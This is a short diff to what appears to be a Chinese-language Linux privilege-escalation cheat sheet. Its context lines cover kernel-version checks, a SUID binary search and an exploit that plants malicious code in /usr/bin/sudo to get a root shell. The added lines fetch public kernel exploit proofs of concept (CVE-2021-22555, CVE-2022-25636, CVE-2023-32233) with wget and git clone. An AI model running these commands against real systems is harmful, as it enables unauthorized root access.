@@ -335,3 +335,8 @@ uname -r                            查看内核版本
 find / -perm -4000 2>/dev/null      查找 SUID 二进制文件
 ./exploit-2 /usr/bin/sudo           自动化修改 /usr/bin/sudo，插入恶意代码，获得 root shell，并恢复 /usr/bin/sudo
 
+
+更多恶意自动化脚本
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+git clone https://github.com/Liuk3r/CVE-2023-32233
